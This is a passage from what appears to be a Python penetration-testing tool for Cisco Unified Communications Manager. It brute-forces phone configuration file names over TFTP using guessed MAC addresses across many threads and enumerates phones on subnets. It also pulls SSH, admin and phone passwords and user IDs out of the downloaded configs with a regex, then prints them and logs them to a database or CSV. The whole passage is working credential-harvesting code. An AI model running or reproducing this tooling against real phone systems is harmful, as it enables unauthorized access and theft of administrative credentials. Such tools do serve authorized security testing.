                candidates_by_cucm[phone_cucm].add((phone_cucm, full_mac, filename))

        # Randomize per-CUCM queues, then interleave to distribute load across servers
        for cucm in candidates_by_cucm:
            # Convert set to list and shuffle
            candidates_by_cucm[cucm] = list(candidates_by_cucm[cucm])
            random.shuffle(candidates_by_cucm[cucm])

        all_candidates = []
        cucm_order = list(candidates_by_cucm.keys())
        idx = 0
        while True:
            added = False
            for cucm in cucm_order:
                if idx < len(candidates_by_cucm[cucm]):
                    all_candidates.append(candidates_by_cucm[cucm][idx])
                    added = True
            if not added:
                break
            idx += 1

        print(f'Randomized {len(all_candidates)} total candidates across all phones\n')
        
        # ============================================================================
        # Multi-threaded brute force download (ONLY used for brute force mode)
        # Regular downloads use single-threaded search_for_secrets() function
        # ============================================================================
        
        # Process all candidates with multi-threading
        # Use the args values that were set earlier (no need for globals().get since they're in scope)
        # db_file, no_db, and force_download are already defined above
        
        if threads < 1:
            print('Threads must be at least 1')
            quit(1)

        print(f'Starting multi-threaded brute force with {threads} workers...')
        
        work_queue = queue.Queue()
        results_queue = queue.Queue()
        backoff_manager = TFTPBackoffManager()
        dead_cucm = set()
        dead_cucm_lock = threading.Lock()
        num_threads = threads
        
        # Create and start worker threads
        threads = []
        for i in range(num_threads):
            t = threading.Thread(
                target=download_worker,
                args=(work_queue, results_queue, None, use_tftp, backoff_manager, no_db, db_file, force_download, dead_cucm, dead_cucm_lock),
                daemon=True,
                name=f'Worker-{i}'
            )
            t.start()
            threads.append(t)

        interrupted = False
        all_configs = []
        found_macs = []
        skipped = 0
        successful = 0
        processed = 0

        try:
            print(f'[*] Started {num_threads} worker threads')
            print(f'[*] Queuing {len(all_candidates)} download tasks...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass

        try:
            # Queue all candidates
            for idx, (cucm, full_mac, filename) in enumerate(all_candidates):
                work_queue.put((idx, full_mac, filename, cucm))
                if (idx + 1) % 10000 == 0:
                    try:
                        print(f'  Queued {idx + 1}/{len(all_candidates)} tasks...', flush=True)
                    except (ValueError, AttributeError):
                        pass  # stdout closed or unavailable

            try:
                print(f'[*] All {len(all_candidates)} tasks queued', flush=True)
                print(f'[*] Processing downloads with {num_threads} workers (this may take several minutes)...\n', flush=True)
            except (ValueError, AttributeError):
                pass

            # Use alive_bar only if output is to a terminal
            use_progress_bar = sys.stdout.isatty()

            if use_progress_bar:
                with alive_bar(len(all_candidates), title=f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: 0") as prog_bar:
                    for _ in range(len(all_candidates)):
                        try:
                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)

                            if was_cached:
                                skipped += 1

                            if content:
                                all_configs.append((full_mac, content))
                                found_macs.append(full_mac)
                                successful += 1
                                # Update progress bar title with current count
                                prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")

                            # Always increment progress bar for each candidate processed
                            prog_bar()

                        except queue.Empty:
                            print('[!] Timeout waiting for results')
                            break
            else:
                # Simple text-based progress for non-TTY output
                try:
                    print(f'[*] Starting to process results...')
                    sys.stdout.flush()

                    last_status_time = time.time()
                    for _ in range(len(all_candidates)):
                        try:
                            index, full_mac, content, method, was_cached = results_queue.get(timeout=120)
                            processed += 1

                            if was_cached:
                                skipped += 1

                            if content:
                                all_configs.append((full_mac, content))
                                found_macs.append(full_mac)
                                successful += 1
                                print(f'[+] Found config #{successful}: SEP{full_mac}')
                                sys.stdout.flush()

                            # Print progress every 1000 items or every 5 seconds
                            current_time = time.time()
                            if processed % 1000 == 0 or (current_time - last_status_time) >= 5:
                                remaining = len(all_candidates) - processed
                                print(f'[*] Progress: {processed}/{len(all_candidates)} processed ({successful} found, {remaining} remaining)')
                                sys.stdout.flush()
                                last_status_time = current_time

                        except queue.Empty:
                            remaining = len(all_candidates) - processed
                            print(f'[!] Timeout after processing {processed}/{len(all_candidates)} items ({remaining} remaining)')
                            break
                        except Exception as e:
                            print(f'[!] ERROR in results processing: {type(e).__name__}: {e}')
                            import traceback
                            traceback.print_exc()
                            sys.stdout.flush()
                            break
                except Exception as outer_e:
                    print(f'[!] FATAL ERROR in else block: {type(outer_e).__name__}: {outer_e}')
                    import traceback
                    traceback.print_exc()
                    sys.stdout.flush()
        except KeyboardInterrupt:
            interrupted = True
            print('\n[!] Interrupted by user. Stopping brute force gracefully.')
        finally:
            # Send poison pills to stop workers
            for _ in range(num_threads):
                work_queue.put(None)

            # Wait for all workers to exit gracefully
            for t in threads:
                t.join()

            # If interrupted, skip work_queue.join() and process results
            if interrupted:
                print('[*] Processing partial results due to user interruption...')
            else:
                # Wait for all queued work to be completed
                try:
                    print(f'\n[*] Waiting for all workers to finish processing...')
                    sys.stdout.flush()
                except (ValueError, AttributeError):
                    pass
                work_queue.join()
                try:
                    print(f'[*] All tasks completed!')
                    sys.stdout.flush()
                except (ValueError, AttributeError):
                    pass
        
        # Wait for all queued work to be completed
        try:
            print(f'\n[*] Waiting for all workers to finish processing...')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        work_queue.join()
        
        try:
            print(f'[*] All tasks completed!')
            sys.stdout.flush()
        except (ValueError, AttributeError):
            pass
        
        # Print summary
        if found_macs:
            mac_list = ', '.join([f"SEP{mac}" for mac in found_macs[:10]])
            suffix = ", ..." if len(found_macs) > 10 else ""
            print(f'\n[+] Found {len(found_macs)} config(s): {mac_list}{suffix}')
        
        if skipped > 0:
            print(f'[*] Skipped {skipped} cached config(s) from previous successful downloads (use --force to re-download)')
        
        print(f'Brute force complete: {successful}/{len(all_candidates)} configs found')
        
        # Process all found configs
        if all_configs:
            print(f'\n\n{"="*60}')
            print(f'SUMMARY: {len(all_configs)} configuration files found!')
            print("="*60)
            
            # Get CUCM host for logging (use first one from mapping)
            summary_cucm = list(mac_to_cucm.values())[0] if mac_to_cucm else 'Multiple-CUCM-Servers'
            
            # Collect all findings
            all_found_credentials = []
            all_found_usernames = []
            devices_with_creds = {}
            devices_with_users = {}
            
            for mac, content in all_configs:
                # Search for secrets in this config
                config_creds = []
                config_users = []
                
                # Track username across the config file
                user = ''
                user2 = ''
                
                for line in content.split('\n'):
                    match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)',line)
                    if match:
                        if match.group(2):
                            user = match.group(2)
                            config_users.append((user, f'SEP{mac}'))
                        if match.group(3):
                            password = match.group(3)
                            config_creds.append((user, password, f'SEP{mac}'))
                        if match.group(4):
                            user2 = match.group(4)
                            config_users.append((user2, f'SEP{mac}'))
                        if match.group(5):
                            password = match.group(5)
                            config_creds.append((user if user else 'unknown', password, f'SEP{mac}'))
                
                # Track devices with findings
                if config_creds:
                    devices_with_creds[f'SEP{mac}'] = config_creds
                    all_found_credentials.extend(config_creds)
                
                if config_users:
                    devices_with_users[f'SEP{mac}'] = config_users
                    all_found_usernames.extend(config_users)
            
            # Display results
            if all_found_credentials or all_found_usernames:
                print(f'\n\n{"="*70}')
                print(f'{"CREDENTIALS DISCOVERY SUMMARY":^70}')
                print("="*70)
                
                if all_found_credentials:
                    print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(all_found_credentials)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
                    print("-"*70)
                    for device, creds in devices_with_creds.items():
                        for cred in creds:
                            username = cred[0] if cred[0] else 'N/A'
                            password = cred[1]
                            print(f'{device:<20} {username:<20} \033[91m{password:<20}\033[0m')
                
                if all_found_usernames:
                    print(f'\n\033[1m[+] USERNAMES FOUND ({len(all_found_usernames)} total)\033[0m')
                    print("-"*70)
                    print(f'{"Device":<20} {"Username":<20}')
                    print("-"*70)
                    for device, users in devices_with_users.items():
                        for username in users:
                            print(f'{device:<20} {username[0]:<20}')
                
                print(f'\n{"="*70}')
                print(f'\n\033[1mSTATISTICS:\033[0m')
                print(f'  • Total configs downloaded:     {len(all_configs)}')
                print(f'  • Devices with credentials:     {len(devices_with_creds)}')
                print(f'  • Devices with usernames only:  {len(devices_with_users)}')
                print(f'  • Total credentials discovered: {len(all_found_credentials)}')
                print(f'  • Total usernames discovered:   {len(all_found_usernames)}')
                if len(mac_to_cucm) > 1:
                    unique_cucms = set(mac_to_cucm.values())
                    print(f'  • CUCM servers:                 {", ".join(sorted(unique_cucms))}')
                print("="*70)
                
                # Log to database (unless --no-db)
                if not no_db:
                    log_credentials_to_db(summary_cucm, all_found_credentials, all_found_usernames, db_file)
                
                # Export to CSV if requested
                if csv_output:
                    csv_filename = csv_output if csv_output != True else 'seeyoucm_results.csv'
                    export_to_csv(all_found_credentials, all_found_usernames, csv_filename)
            else:
                print(f'\n\n{"="*70}')
                print(f'  No credentials or usernames found in {len(all_configs)} configs')
                print("="*70)
        else:
            print('\nNo configuration files found')
        
        quit(0)

    # Utility function for hostname resolution
    def hostname_resolves(hostname):
        try:
            socket.gethostbyname(hostname)
            return True
        except Exception:
            return False

    if enumsubnet:
        hosts = enumerate_phones_subnet(enumsubnet)
        if hosts is None:
            hosts = []
        for host in hosts:
            found_credentials.clear()
            found_usernames.clear()
            if CUCM_host is None:
                CUCM_host = get_cucm_name_from_phone(host["ip"])
            if CUCM_host is not None and hostname_resolves(CUCM_host):
                file_names = get_config_names(CUCM_host, hostnames=[host["hostname"]])
                if file_names is None:
                    file_names = []
                for file in file_names:
                    print(f'Connecting to {CUCM_host} and getting config for {host["ip"]}/{host["hostname"]}')
                    search_for_secrets(CUCM_host, file, use_tftp)
                if found_credentials != []:
                    print('Credentials Found in Configurations!')
                for cred in found_credentials:
                    print('{0}\t{1}\t{2}'.format(cred[0],cred[1],cred[2]))
                if found_usernames != []:
                    print('Usernames Found in Configurations!')
                for usernames in found_usernames:
                    print('{0}\t{1}'.format(usernames[0],usernames[1]))
            print("\n")
        quit(0)
    elif phones:
        print_lock = threading.Lock()

        def _safe_print(message):
            with print_lock:
                print(message)

        def process_phone(phone):
            local_credentials = []
            local_usernames = []
            _safe_print(f'\nProcessing phone: {phone}')

            if args.host is None:
                phone_cucm = get_cucm_name_from_phone(phone)
            else:
                phone_cucm = args.host

            if phone_cucm is None:
                _safe_print(f'Unable to automatically detect the CUCM Server for {phone}. Skipping...')
                return

            _safe_print('The detected IP address/hostname for the CUCM server is {}'.format(phone_cucm))
            if not no_db:
                log_phone_cucm_to_db(phone_cucm, phone, db_file)

            # Get hostnames for this phone
            hostnames = [get_hostname_from_phone(phone)]
            hostnames += get_phones_hostnames_from_reverse(phone) or []

            # Get config files
            file_names = get_config_names(phone_cucm, hostnames=hostnames)
            if file_names is None:
                _safe_print('Unable to detect file names from CUCM for {}'.format(phone))
                return

            # Search for secrets
            for file in file_names:
                creds, users = search_for_secrets(phone_cucm, file, use_tftp)
                if creds:
                    local_credentials.extend(creds)
                if users:
                    local_usernames.extend(users)

            # Display results for this phone
            if local_credentials:
                _safe_print('Credentials Found in Configurations!')
                for cred in local_credentials:
                    _safe_print('{0}\t{1}\t{2}'.format(cred[0], cred[1], cred[2]))

            if local_usernames:
                _safe_print('Usernames Found in Configurations!')
                for usernames in local_usernames:
                    _safe_print('{0}\t{1}'.format(usernames[0], usernames[1]))

            if not no_db and (local_credentials or local_usernames):
                log_credentials_to_db(phone_cucm, local_credentials, local_usernames, db_file)

        num_workers = min(threads, len(phones)) if threads else 1
        if num_workers < 1:
            print('Threads must be at least 1')
            quit(1)

        if num_workers == 1:
            for phone in phones:
                process_phone(phone)
            quit(0)

        phone_queue = queue.Queue()

        def phone_worker():
            while True:
                phone = phone_queue.get()
                if phone is None:
                    phone_queue.task_done()
                    break
                process_phone(phone)
                phone_queue.task_done()

        workers = []
        for i in range(num_workers):
            t = threading.Thread(target=phone_worker, daemon=True, name=f'PhoneWorker-{i}')
            t.start()
            workers.append(t)

        for phone in phones:
            phone_queue.put(phone)

        phone_queue.join()
        for _ in range(num_workers):
            phone_queue.put(None)
        for t in workers:
            t.join()

        quit(0)
    elif args.host:
        CUCM_host = args.host
    else:
        print('You must enter either a phone IP address or the IP address of the CUCM server')
        quit(1)
    file_names = get_config_names(CUCM_host, hostnames=hostnames or None, use_tftp=use_tftp)
    if not file_names and phones:
        hostnames = [get_hostname_from_phone(phones[0])]
        hostnames += get_phones_hostnames_from_reverse(phones[0]) or []
        file_names = get_config_names(CUCM_host, hostnames=hostnames, use_tftp=use_tftp)

    if not file_names:
        print('[-] No config file names discovered (ConfigFileCacheList.txt unreachable and no hostnames provided).')
        print('[*] Try adding -p <phone_ip>, -b/--brute-mac, --userenum, or -e <cidr>.')
        quit(1)
    else:
        print(f'[+] Discovered {len(file_names)} config file name(s) to inspect')
        # Results are collected in all_credentials and all_usernames below
        all_credentials = []
        all_usernames = []
        if file_names:
            for file in file_names:
                creds, users = search_for_secrets(CUCM_host, file, use_tftp)
                all_credentials.extend(creds)
                all_usernames.extend(users)

        if all_credentials:
            print('Credentials Found in Configurations!')
            for cred in all_credentials:
                print('{0}\t{1}\t{2}'.format(cred[0], cred[1], cred[2]))

        if all_usernames:
            print('Usernames Found in Configurations!')
            for usernames in all_usernames:
                print('{0}\t{1}'.format(usernames[0], usernames[1]))

        # Always write to database unless --no-db is set
        if not no_db and (all_credentials or all_usernames):
            if debug:
                print(f'[DEBUG] Writing to DB: CUCM_host={CUCM_host}, credentials={all_credentials}, usernames={all_usernames}, db_file={db_file}')
            result = log_credentials_to_db(CUCM_host, all_credentials, all_usernames, db_file)
            if debug:
                print(f'[DEBUG] log_credentials_to_db returned: {result}')
        quit(0)

if __name__ == '__main__':
    main()
